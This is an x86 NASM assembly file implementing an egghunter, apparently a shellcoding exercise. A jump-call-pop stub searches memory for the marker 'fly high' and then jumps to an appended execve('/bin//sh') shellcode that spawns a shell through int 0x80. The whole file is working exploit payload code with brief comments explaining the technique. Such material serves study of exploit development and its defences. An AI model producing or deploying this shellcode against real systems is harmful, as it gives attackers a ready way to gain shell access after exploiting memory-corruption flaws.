
section .data
        mark1     equ "fly "	;Marks of the egg
	mark2     equ "high"

section .text
    global  _start

_start:
        jmp     _return

_continue:
	pop     eax	;JumpCallPop technique to store in eax the next memory address of the call instruction
            
_next:
	 inc     eax	;Searching parto to find the mark of the egg 

_isEgg:
        cmp     dword [eax-8],mark1	;Compare of eax-8 with mark1, if it is not equal _next, if equal continue
        jne     _next
        cmp     dword [eax-4],mark2	;Compare of eax-4 with mark2, if it is not equal _next, if equal continue
        jne     _next
        jmp     eax			;Jump to execute the maincode of the staged shellcode, the egg
_return:
        call    _continue
_egg:
        db  "fly high"	;Egg mark
	;Execve shellcode              
        xor eax, eax
        push eax
        push 0x68732f2f
        push 0x6e69622f
        mov ebx, esp
        push eax
        mov edx, esp
        push ebx
        mov ecx, esp
        mov al, 11
        int 0x80
